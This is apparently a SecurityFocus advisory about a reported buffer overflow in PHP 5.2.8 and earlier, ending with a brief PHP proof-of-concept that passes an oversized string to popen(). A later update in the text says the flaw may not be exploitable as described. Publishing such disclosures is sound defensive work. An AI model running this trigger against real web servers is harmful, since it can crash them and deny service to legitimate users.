source: http://www.securityfocus.com/bid/33216/info

PHP is prone to a buffer-overflow vulnerability because it fails to perform boundary checks before copying user-supplied data to insufficiently sized memory buffers.

An attacker can exploit this issue to execute arbitrary machine code in the context of the affected webserver. Failed exploit attempts will likely crash the webserver, denying service to legitimate users.

PHP 5.2.8 and prior versions are vulnerable.

UPDATE (March 4, 2009): Further reports indicate that this issue may not be exploitable as described. We will update this BID pending further investigation. 

<?php
$____buff=str_repeat("A",9999);
$handle = popen('/whatever/', $____buff);
echo $handle;
?>